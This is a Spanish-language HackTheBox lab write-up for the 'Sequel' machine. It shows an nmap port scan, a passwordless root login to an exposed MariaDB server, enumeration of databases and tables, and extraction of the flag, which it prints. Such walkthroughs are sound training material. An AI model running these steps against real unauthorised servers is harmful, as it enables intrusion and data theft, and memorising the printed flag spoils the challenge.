---
titulo: "Sequel"
descripcion: "Acceso a instancia MariaDB expuesta sin autenticación para extraer flag de base de datos mediante queries SQL directas."
fecha: 2026-06-04
dificultad: easy
herramientas: ["nmap", "mysql"]
categoria: htb
plataforma: HackTheBox
completado: true
---

## Reconocimiento

Fase 1 — descubrimiento de puertos:

```bash
nmap -vvv -p- --open -sS --min-rate 5000 -n -Pn 10.129.51.191
```

Fase 2 — detección de versiones y scripts sobre los puertos encontrados:

```bash
nmap -p3306 10.129.51.191 -sCV
```

Puerto abierto: **3306/tcp (MariaDB 10.3.27)**

## Foothold

MariaDB expuesto sin autenticación. El cliente moderno requiere deshabilitar SSL explícitamente para conectar a servidores sin TLS:

```bash
mysql -h 10.129.51.191 -u root --skip-ssl
```

Enumeración de bases de datos:

```sql
SHOW DATABASES;
```
Output:
```
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```
La base `htb` es la única no estándar. Enumeración de tablas:

```sql
USE htb;
SHOW TABLES;
```
Output:
```
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
```

Extracción de flag desde la tabla `config`:

```sql
SELECT * FROM config;
```
Output:
```
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
```
## Flags

| Flag | Hash |
|------|------|
| Root | `7b4bec00d1a39e3dd4e021ec3d915da8` |
